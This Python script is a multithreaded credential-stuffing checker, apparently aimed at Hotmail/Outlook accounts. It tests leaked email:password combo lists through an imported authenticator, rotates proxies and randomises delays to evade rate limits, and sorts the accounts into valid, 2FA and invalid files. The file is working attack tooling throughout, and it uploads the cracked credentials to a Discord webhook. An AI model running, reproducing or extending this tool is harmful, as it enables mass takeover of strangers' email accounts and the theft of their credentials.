import os
import sys
import yaml
import requests
import random
import time
import itertools
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Semaphore
from collections import deque
from mailhub import LiveAuthenticator

class Palette:
    RED = '\033[38;5;196m'
    GREEN = '\033[92m'
    YELLOW = '\033[38;5;226m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

printMutex = Lock()
fileMutex = Lock()
statsMutex = Lock()
proxyMutex = Lock()

CONFIG_DIR = "config"
CONFIG_PATH = os.path.join(CONFIG_DIR, "config.yml")

BASE_CONFIG = {
    'threads': 50,
    'use_proxies': False,
    'proxy_type': 'http',
    'proxy_file': 'proxies.txt',
    'discord_webhook': None,
    'delay_enabled': True,
    'delay_seconds': 0.7,
    'max_retries': 3,
    'timeout': 30
}

def ensureConfigFolder():
    if not os.path.exists(CONFIG_DIR):
        os.makedirs(CONFIG_DIR)

def loadSettings():
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
                cfg = yaml.safe_load(f)
                if cfg:
                    for key in BASE_CONFIG:
                        if key not in cfg:
                            cfg[key] = BASE_CONFIG[key]
                    return cfg
        except Exception:
            pass
    return BASE_CONFIG.copy()

def saveSettings(cfg):
    ensureConfigFolder()
    try:
        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
            yaml.dump(cfg, f, default_flow_style=False, allow_unicode=True)
    except Exception:
        pass

def sendToDiscord(webhook, validCount, twofaCount):
    if not webhook:
        return
    try:
        filesData = {}
        embedsList = []
        if validCount > 0 and os.path.exists('hits.txt'):
            with open('hits.txt', 'rb') as f:
                filesData['hits.txt'] = f.read()
            embedsList.append({
                "title": f"VALID {validCount}",
                "description": "hits.txt attached",
                "color": 0x00FF00,
                "timestamp": datetime.now(timezone.utc).isoformat()
            })
        if twofaCount > 0 and os.path.exists('2fa.txt'):
            with open('2fa.txt', 'rb') as f:
                filesData['2fa.txt'] = f.read()
            embedsList.append({
                "title": f"2FA {twofaCount}",
                "description": "2fa.txt attached",
                "color": 0xFFA500,
                "timestamp": datetime.now(timezone.utc).isoformat()
            })
        if embedsList:
            payload = {"embeds": embedsList}
            files = {name: (name, content) for name, content in filesData.items()}
            requests.post(webhook, data={"payload_json": str(payload).replace("'", '"')}, files=files, timeout=10)
    except Exception:
        pass

def loadProxyList(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
        unique_proxies = []
        seen = set()
        for p in proxies:
            if p not in seen:
                seen.add(p)
                unique_proxies.append(p)
        return unique_proxies
    except FileNotFoundError:
        print(f"{Palette.RED}[ERROR] Proxy file '{filename}' not found{Palette.RESET}")
        return []
    except Exception as e:
        print(f"{Palette.RED}[ERROR] {str(e)}{Palette.RESET}")
        return []

class ProxyRotator:
    def __init__(self, proxies, proxy_type):
        self.proxies = deque(proxies)
        self.proxy_type = proxy_type
        self.lock = Lock()
    
    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy_addr = self.proxies[0]
            self.proxies.rotate(1)
            clean_addr = proxy_addr.split('://', 1)[1] if '://' in proxy_addr else proxy_addr
            if self.proxy_type == 'socks5':
                scheme = 'socks5'
            elif self.proxy_type == 'socks4':
                scheme = 'socks4'
            else:
                scheme = 'http'
            return {
                'http': f'{scheme}://{clean_addr}',
                'https': f'{scheme}://{clean_addr}'
            }

def configureSettings(cfg):
    print(f"\n{Palette.CYAN}╭─ PROXY SETTINGS{Palette.RESET}")
    useProxy = input(f"{Palette.CYAN}╰─> Use proxies? (y/n): {Palette.RESET}").strip().lower()
    cfg['use_proxies'] = (useProxy == 'y')
    if cfg['use_proxies']:
        print(f"\n{Palette.CYAN}╭─ PROXY TYPE{Palette.RESET}")
        ptype = input(f"{Palette.CYAN}╰─> http/https/socks4/socks5: {Palette.RESET}").strip().lower()
        if ptype in ['http', 'https', 'socks4', 'socks5']:
            cfg['proxy_type'] = ptype
        else:
            print(f"{Palette.YELLOW}[!] Invalid, using http{Palette.RESET}")
            cfg['proxy_type'] = 'http'
        print(f"\n{Palette.CYAN}╭─ PROXY FILE{Palette.RESET}")
        pfile = input(f"{Palette.CYAN}╰─> Filename (default: proxies.txt): {Palette.RESET}").strip()
        if pfile:
            cfg['proxy_file'] = pfile
        else:
            cfg['proxy_file'] = 'proxies.txt'
    else:
        cfg['proxy_type'] = 'http'
        cfg['proxy_file'] = 'proxies.txt'
    print(f"\n{Palette.CYAN}╭─ THREAD SETTINGS{Palette.RESET}")
    thrInput = input(f"{Palette.CYAN}╰─> Thread count (1-200, default 50): {Palette.RESET}").strip()
    if thrInput:
        try:
            thr = int(thrInput)
            cfg['threads'] = max(1, min(thr, 200))
        except ValueError:
            print(f"{Palette.YELLOW}[!] Invalid, keeping {cfg['threads']}{Palette.RESET}")
    print(f"\n{Palette.CYAN}╭─ DELAY SETTINGS{Palette.RESET}")
    delayChoice = input(f"{Palette.CYAN}╰─> Enable delay? (y/n): {Palette.RESET}").strip().lower()
    cfg['delay_enabled'] = (delayChoice == 'y')
    if cfg['delay_enabled']:
        secInput = input(f"{Palette.CYAN}╰─> Delay seconds (0.3-1.5, default 0.7): {Palette.RESET}").strip()
        if secInput:
            try:
                sec = float(secInput)
                cfg['delay_seconds'] = max(0.3, min(sec, 1.5))
            except ValueError:
                cfg['delay_seconds'] = 0.7
    print(f"\n{Palette.CYAN}╭─ DISCORD WEBHOOK{Palette.RESET}")
    webhookChoice = input(f"{Palette.CYAN}╰─> Enable Discord webhook? (y/n): {Palette.RESET}").strip().lower()
    if webhookChoice == 'y':
        whUrl = input(f"{Palette.CYAN}╰─> Webhook URL: {Palette.RESET}").strip()
        cfg['discord_webhook'] = whUrl if whUrl else None
    else:
        cfg['discord_webhook'] = None
    saveSettings(cfg)
    print(f"\n{Palette.GREEN}[✓] Configuration saved{Palette.RESET}")
    time.sleep(1)
    return cfg

def showConfig(cfg):
    print(f"\n{Palette.CYAN}╔{'═' * 42}╗{Palette.RESET}")
    print(f"{Palette.CYAN}║{Palette.RESET} {Palette.MAGENTA}{Palette.BOLD}CURRENT CONFIGURATION{Palette.RESET}{' ' * 18}{Palette.CYAN}║{Palette.RESET}")
    print(f"{Palette.CYAN}╠{'═' * 42}╣{Palette.RESET}")
    print(f"{Palette.CYAN}║{Palette.RESET} Threads: {Palette.GREEN}{cfg['threads']}{Palette.RESET}{' ' * (31 - len(str(cfg['threads'])))} {Palette.CYAN}║{Palette.RESET}")
    proxy_stat = "Yes" if cfg['use_proxies'] else "No"
    proxy_color = Palette.GREEN if cfg['use_proxies'] else Palette.RED
    print(f"{Palette.CYAN}║{Palette.RESET} Proxies: {proxy_color}{proxy_stat}{Palette.RESET}{' ' * (31 - len(proxy_stat))} {Palette.CYAN}║{Palette.RESET}")
    if cfg['use_proxies']:
        print(f"{Palette.CYAN}║{Palette.RESET} Proxy Type: {Palette.YELLOW}{cfg['proxy_type']}{Palette.RESET}{' ' * (26 - len(cfg['proxy_type']))} {Palette.CYAN}║{Palette.RESET}")
    delay_stat = "Yes" if cfg['delay_enabled'] else "No"
    delay_color = Palette.GREEN if cfg['delay_enabled'] else Palette.RED
    print(f"{Palette.CYAN}║{Palette.RESET} Delay: {delay_color}{delay_stat}{Palette.RESET}{' ' * (33 - len(delay_stat))} {Palette.CYAN}║{Palette.RESET}")
    if cfg['delay_enabled']:
        print(f"{Palette.CYAN}║{Palette.RESET} Delay Sec: {Palette.YELLOW}{cfg['delay_seconds']}{Palette.RESET}{' ' * (28 - len(str(cfg['delay_seconds'])))} {Palette.CYAN}║{Palette.RESET}")
    webhook_stat = "Yes" if cfg['discord_webhook'] else "No"
    webhook_color = Palette.GREEN if cfg['discord_webhook'] else Palette.RED
    print(f"{Palette.CYAN}║{Palette.RESET} Discord: {webhook_color}{webhook_stat}{Palette.RESET}{' ' * (31 - len(webhook_stat))} {Palette.CYAN}║{Palette.RESET}")
    print(f"{Palette.CYAN}╚{'═' * 42}╝{Palette.RESET}")

def isValidPair(line):
    line = line.strip()
    if not line:
        return False
    if line.count(':') != 1:
        return False
    parts = line.split(':', 1)
    if len(parts) != 2:
        return False
    mail, pwd = parts[0].strip(), parts[1].strip()
    if '@' not in mail or len(mail) < 5:
        return False
    if not pwd or len(pwd) < 1:
        return False
    spam_signs = ['telegram', 't.me', 'discord', 'http://', 'https://', '___', '!!!', '##', '@@', '__']
    if any(s.lower() in line.lower() for s in spam_signs):
        return False
    return True

def loadCombinations(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            all_lines = [line.strip() for line in f if line.strip()]
        valid_lines = [line for line in all_lines if isValidPair(line)]
        seen = set()
        unique_lines = []
        for line in valid_lines:
            if line not in seen:
                seen.add(line)
                unique_lines.append(line)
        return unique_lines
    except FileNotFoundError:
        print(f"{Palette.RED}[ERROR] '{filename}' not found{Palette.RESET}")
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("")
        return []
    except Exception as e:
        print(f"{Palette.RED}[ERROR] {str(e)}{Palette.RESET}")
        return []

def loadAlreadyChecked():
    checked_emails = set()
    result_files = ['hits.txt', '2fa.txt', 'invalid.txt']
    for fname in result_files:
        if os.path.exists(fname):
            try:
                with open(fname, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if ':' in line:
                            email = line.split(':', 1)[0]
                            checked_emails.add(email)
            except Exception:
                continue
    return checked_emails

def saveResult(filename, content):
    try:
        with fileMutex:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        return True
    except Exception:
        return False

def examineAccount(authenticator, email, password, proxy_config, max_retries):
    for attempt in range(max_retries):
        try:
            outcome = authenticator.authenticate(email, password, proxy_config)
            if outcome[0] != "retry":
                if outcome[0] == "ok":
                    return "VALID", outcome[1] if len(outcome) > 1 else None
                elif outcome[0] == "nfa":
                    return "2FA", None
                elif outcome[0] == "fail":
                    return "INVALID", None
                else:
                    return "INVALID", None
            if attempt < max_retries - 1:
                time.sleep(random.uniform(1.0, 2.0))
        except Exception:
            if attempt == max_retries - 1:
                return "INVALID", None
            time.sleep(random.uniform(1.0, 2.0))
    return "INVALID", None

def showBanner():
    banner = f"""
{Palette.MAGENTA}{Palette.BOLD}██╗  ██╗ ██████╗ ████████╗███╗   ███╗ █████╗ ██╗██╗     
██║  ██║██╔═══██╗╚══██╔══╝████╗ ████║██╔══██╗██║██║     
███████║██║   ██║   ██║   ██╔████╔██║███████║██║██║     
██╔══██║██║   ██║   ██║   ██║╚██╔╝██║██╔══██║██║██║     
██║  ██║╚██████╔╝   ██║   ██║ ╚═╝ ██║██║  ██║██║███████╗
╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝

██╗   ██╗ █████╗  ██████╗██╗   ██╗██╗   ██╗███╗   ███╗
██║   ██║██╔══██╗██╔════╝██║   ██║██║   ██║████╗ ████║
██║   ██║███████║██║     ██║   ██║██║   ██║██╔████╔██║
╚██╗ ██╔╝██╔══██║██║     ██║   ██║██║   ██║██║╚██╔╝██║
 ╚████╔╝ ██║  ██║╚██████╗╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
  ╚═══╝  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝{Palette.RESET}
{Palette.CYAN}                  developed by @tc4dy{Palette.RESET}
"""
    print(banner)

def logOutput(status, combo):
    timestamp = datetime.now().strftime("%H:%M:%S")
    if status == "VALID":
        with printMutex:
            print(f"{Palette.GREEN}[{timestamp}] VALID: {combo}{Palette.RESET}")
    elif status == "2FA":
        with printMutex:
            print(f"{Palette.YELLOW}[{timestamp}] 2FA: {combo}{Palette.RESET}")
    elif status == "INVALID":
        with printMutex:
            print(f"{Palette.RED}[{timestamp}] INVALID: {combo}{Palette.RESET}")

def handleCredential(combo, rotator, idx, total, stats, delay_enabled, delay_sec, max_retries):
    authenticator = None
    try:
        email, password = combo.split(':', 1)
        authenticator = LiveAuthenticator()
        proxy_config = rotator.get_proxy() if rotator else None
        status, extra = examineAccount(authenticator, email, password, proxy_config, max_retries)
        with statsMutex:
            stats['checked'] += 1
            if status == "VALID":
                stats['valid'] += 1
                saveResult('hits.txt', combo)
                logOutput("VALID", combo)
            elif status == "2FA":
                stats['2fa'] += 1
                saveResult('2fa.txt', combo)
                logOutput("2FA", combo)
            elif status == "INVALID":
                stats['invalid'] += 1
                saveResult('invalid.txt', combo)
                logOutput("INVALID", combo)
            remaining = stats['total'] - stats['checked']
            if remaining % 10 == 0 or remaining < 5:
                print(f"{Palette.CYAN}[PROGRESS] {stats['checked']}/{stats['total']} | VALID:{stats['valid']} 2FA:{stats['2fa']}{Palette.RESET}")
        if delay_enabled:
            jitter = random.uniform(delay_sec * 0.8, delay_sec * 1.2)
            time.sleep(jitter)
    except Exception:
        with statsMutex:
            stats['invalid'] += 1
    finally:
        if authenticator:
            del authenticator

def generateReport(stats, startTime, cfg):
    elapsed = time.time() - startTime
    success_rate = (stats['valid'] / stats['total'] * 100) if stats['total'] > 0 else 0
    speed = stats['total'] / elapsed if elapsed > 0 else 0
    report = f"""
╔══════════════════════════════════════════════════════════════╗
║                      CHECK REPORT                            ║
╠══════════════════════════════════════════════════════════════╣
║ Total Accounts:      {stats['total']}
║ Valid (No 2FA):      {stats['valid']}
║ 2FA Required:        {stats['2fa']}
║ Invalid/Failed:      {stats['invalid']}
║ Success Rate:        {success_rate:.2f}%
║ Time Elapsed:        {elapsed:.2f} seconds
║ Speed:               {speed:.2f} acc/sec
║ Threads Used:        {cfg['threads']}
║ Proxies Used:        {'Yes' if cfg['use_proxies'] else 'No'}
║ Delay Enabled:       {'Yes' if cfg['delay_enabled'] else 'No'}
╚══════════════════════════════════════════════════════════════╝
"""
    with open('report.txt', 'w', encoding='utf-8') as f:
        f.write(report)
    print(f"\n{Palette.CYAN}{report}{Palette.RESET}")

def runChecker():
    clearTerminal()
    showBanner()
    ensureConfigFolder()
    config = loadSettings()
    showConfig(config)
    print(f"\n{Palette.CYAN}╭─ CONFIGURATION{Palette.RESET}")
    happy = input(f"{Palette.CYAN}╰─> Happy with config? (y to start, n to edit): {Palette.RESET}").strip().lower()
    if happy == 'n':
        config = configureSettings(config)
        clearTerminal()
        showBanner()
        showConfig(config)
    combo_file = "combos.txt"
    all_combos = loadCombinations(combo_file)
    if not all_combos:
        print(f"\n{Palette.RED}[ERROR] No valid combos found in combos.txt{Palette.RESET}")
        input(f"\n{Palette.WHITE}Press Enter to exit...{Palette.RESET}")
        return
    checked_emails = loadAlreadyChecked()
    original_count = len(all_combos)
    fresh_combos = []
    for combo in all_combos:
        email = combo.split(':', 1)[0]
        if email not in checked_emails:
            fresh_combos.append(combo)
    skipped = original_count - len(fresh_combos)
    print(f"\n{Palette.GREEN}[✓] Loaded {original_count} combos, {skipped} skipped (already checked){Palette.RESET}")
    print(f"{Palette.GREEN}[✓] Fresh combos to check: {len(fresh_combos)}{Palette.RESET}")
    rotator = None
    if config['use_proxies'] and config.get('proxy_file'):
        proxy_list = loadProxyList(config['proxy_file'])
        if proxy_list:
            print(f"{Palette.GREEN}[✓] Loaded {len(proxy_list)} proxies{Palette.RESET}")
            if config['threads'] > 100:
                print(f"{Palette.YELLOW}[!] Reducing threads to 100 for proxy stability{Palette.RESET}")
                config['threads'] = 100
            rotator = ProxyRotator(proxy_list, config['proxy_type'])
        else:
            print(f"{Palette.YELLOW}[!] No proxies loaded, continuing without proxies{Palette.RESET}")
            config['use_proxies'] = False
    print()
    stats = {
        'total': len(fresh_combos),
        'checked': 0,
        'valid': 0,
        '2fa': 0,
        'invalid': 0
    }
    start_time = time.time()
    try:
        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
            futures = []
            for i, combo in enumerate(fresh_combos, 1):
                future = executor.submit(
                    handleCredential,
                    combo,
                    rotator,
                    i,
                    stats['total'],
                    stats,
                    config['delay_enabled'],
                    config['delay_seconds'],
                    config['max_retries']
                )
                futures.append(future)
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
    except KeyboardInterrupt:
        print(f"\n\n{Palette.YELLOW}[!] Stopped by user{Palette.RESET}")
    print(f"\n\n{Palette.GREEN}{Palette.BOLD}CHECKING COMPLETE{Palette.RESET}\n")
    if stats['valid'] > 0:
        print(f"{Palette.GREEN}[✓] {stats['valid']} Valid accounts saved to: hits.txt{Palette.RESET}")
    if stats['2fa'] > 0:
        print(f"{Palette.YELLOW}[✓] {stats['2fa']} 2FA accounts saved to: 2fa.txt{Palette.RESET}")
    if stats['invalid'] > 0:
        print(f"{Palette.RED}[✓] {stats['invalid']} Invalid accounts saved to: invalid.txt{Palette.RESET}")
    generateReport(stats, start_time, config)
    if config['discord_webhook'] and (stats['valid'] > 0 or stats['2fa'] > 0):
        print(f"\n{Palette.CYAN}[✓] Sending results to Discord{Palette.RESET}")
        sendToDiscord(config['discord_webhook'], stats['valid'], stats['2fa'])
    input(f"\n{Palette.WHITE}Press Enter to exit...{Palette.RESET}")

def clearTerminal():
    os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    try:
        runChecker()
    except KeyboardInterrupt:
        print(f"\n{Palette.YELLOW}[!] Terminated{Palette.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Palette.RED}[ERROR] {str(e)}{Palette.RESET}")
        input(f"{Palette.WHITE}Press Enter to exit...{Palette.RESET}")
        sys.exit(1)
